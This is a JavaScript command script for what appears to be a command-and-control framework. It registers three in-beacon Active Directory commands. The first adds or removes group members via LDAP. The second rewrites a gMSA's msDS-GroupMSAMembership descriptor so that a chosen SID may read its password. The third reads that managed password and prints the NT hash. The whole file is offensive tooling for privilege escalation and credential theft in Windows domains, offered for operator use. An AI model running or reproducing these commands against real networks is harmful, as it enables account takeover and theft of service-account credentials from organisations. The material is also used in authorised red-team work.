var metadata = {
    name: "ADDS-BOF",
    description: "Active Directory Domain Services BOFs"
};


var cmd_groupmod = ax.create_command(
    "groupmod",
    "Add or remove a DN from a group's member attribute via in-beacon LDAP modify",
    "groupmod dc01.corp.local 'CN=SomeGroup,OU=Groups,DC=corp,DC=local' 'CN=WIN01,CN=Computers,DC=corp,DC=local' add"
);

cmd_groupmod.addArgString("dc",        true,  "DC hostname / FQDN");
cmd_groupmod.addArgString("group_dn",  true,  "Target group DN");
cmd_groupmod.addArgString("member_dn", true,  "DN to add or remove");
cmd_groupmod.addArgString("action",    false, "add (default) or remove");

cmd_groupmod.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dc        = parsed_json["dc"];
    let group_dn  = parsed_json["group_dn"];
    let member_dn = parsed_json["member_dn"];
    let action    = parsed_json["action"] || "add";

    let bof_params = ax.bof_pack(
        "wstr,wstr,wstr,wstr",
        [dc, group_dn, member_dn, action]
    );

    let bof_path = ax.script_dir() + "_bin/groupmod." + ax.arch(id) + ".o";
    let message  = "groupmod (" + action + "): " + member_dn + " -> " + group_dn;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});


var cmd_gmsa_authorize = ax.create_command(
    "gmsa-authorize",
    "Write or clear SD on msDS-GroupMSAMembership (gMSA password authorization)",
    "gmsa-authorize dc01.corp.local 'CN=gmsa01,CN=Managed Service Accounts,DC=corp,DC=local' set 'S-1-5-21-1000000000-1000000000-1000000000-1234'"
);

cmd_gmsa_authorize.addArgString("dc",             true,  "DC hostname / FQDN");
cmd_gmsa_authorize.addArgString("gmsa_dn",        true,  "Target gMSA DN");
cmd_gmsa_authorize.addArgString("action",         false, "set (default) or clear");
cmd_gmsa_authorize.addArgString("authorized_sid", false, "SID string to authorize (required for set, ignored for clear)");

cmd_gmsa_authorize.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dc             = parsed_json["dc"];
    let gmsa_dn        = parsed_json["gmsa_dn"];
    let action         = parsed_json["action"] || "set";
    let authorized_sid = parsed_json["authorized_sid"] || "";

    let bof_params = ax.bof_pack(
        "wstr,wstr,wstr,wstr",
        [dc, gmsa_dn, action, authorized_sid]
    );

    let bof_path = ax.script_dir() + "_bin/gmsa-authorize." + ax.arch(id) + ".o";
    let message  = "gmsa-authorize (" + action + "): " + gmsa_dn;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});


var cmd_gmsa_readpwd = ax.create_command(
    "gmsa-readpwd",
    "Read gMSA managed password and output NT hash (rc4_hmac)",
    "gmsa-readpwd dc01.corp.local gmsa01 'DC=corp,DC=local'"
);

cmd_gmsa_readpwd.addArgString("dc",        true, "DC hostname / FQDN");
cmd_gmsa_readpwd.addArgString("gmsa_name", true, "gMSA sAMAccountName ($ appended if missing)");
cmd_gmsa_readpwd.addArgString("dn",        true, "Search base DN (e.g. DC=corp,DC=local)");

cmd_gmsa_readpwd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let dc        = parsed_json["dc"];
    let gmsa_name = parsed_json["gmsa_name"];
    let dn        = parsed_json["dn"];

    let bof_params = ax.bof_pack(
        "wstr,wstr,wstr",
        [dc, gmsa_name, dn]
    );

    let bof_path = ax.script_dir() + "_bin/gmsa-readpwd." + ax.arch(id) + ".o";
    let message  = "gmsa-readpwd: " + gmsa_name;

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
});


var adds_group = ax.create_commands_group("ADDS-BOF", [cmd_groupmod, cmd_gmsa_authorize, cmd_gmsa_readpwd]);
ax.register_commands_group(adds_group, ["beacon"], ["windows"], []);
